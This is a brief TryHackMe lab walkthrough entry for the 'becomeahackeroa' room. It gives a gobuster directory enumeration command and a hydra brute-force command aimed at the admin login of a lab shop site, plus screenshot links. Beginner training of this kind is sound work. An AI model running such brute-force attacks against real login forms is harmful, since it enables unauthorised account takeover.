### 28-Feb-24-Wed

[becomeahackeroa](https://tryhackme.com/room/becomeahackeroa)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a1afdebf-cfd1-484a-992c-6754bfff3a18)

```
gobuster dir --url http://www.onlineshop.thm/ -w /usr/share/wordlists/dirbuster/directory-list.txt
```

```
hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/cb5ccfb5-36ec-43db-9f10-c968857622bc)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/11715c3e-27cf-4417-ac08-21ac40e1fcd8)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/3f02545e-8d21-4a87-bb6e-dfdabc52b238)
